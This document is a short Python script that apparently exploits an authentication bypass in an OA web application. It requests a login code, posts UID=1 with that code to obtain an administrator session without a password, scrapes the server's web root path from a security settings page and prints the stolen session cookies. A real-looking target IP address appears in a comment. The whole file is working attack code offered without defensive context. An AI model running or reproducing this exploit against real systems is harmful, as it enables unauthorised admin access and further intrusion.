# !/usr/bin/env python
# coding: utf-8
# author:x1uq1n9

import requests, re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

session = requests.session()
session.keep_alive = False

# oa_addr = 'http://59.39.69.246:88/'

headers = {
    'Accept-Encoding': 'gzip, deflate',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
    'Connection': 'close'
}


def login(oa_addr):
    login_url = '{}/logincheck_code.php'.format(oa_addr)
    login_code_url = '{}/general/login_code.php?codeuid=1'.format(oa_addr)

    login_headers = headers
    login_headers['X-Requested-With'] = 'XMLHttpRequest'
    login_headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
    login_headers['Connection'] = 'close'

    # requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    res = session.get(login_code_url, headers=headers,verify=False, timeout=3)
    code_uid = res.text.strip()[-40:-2]

    login_data = 'UID=1&CODEUID={}'.format(code_uid)

    res = session.post(login_url, data=login_data.encode('utf-8'), headers=login_headers, verify=False, timeout=3)

    if '"status":1' in res.text:
        return True

    return False


def get_path(oa_addr):
    url = '{}/general/system/security/service.php'.format(oa_addr)

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    res = session.get(url, headers=headers, verify=False, timeout=3)

    web_path = ''
    # 避免正则报错
    for i in res.text.split("\n"):
        if 'WEBROOT' in i:
            web_path = i.split('"')[-4]

    return web_path.replace('\\', '\\\\')


def test(url):
    if not login(url):
        print(url + '   login failed.')
        return False

    web_path = get_path(url)
    print(url)
    print('webroot: ', web_path)

    cookies = ';'.join([k + '=' + v for k, v in session.cookies.items()])
    print('cookies: ', cookies)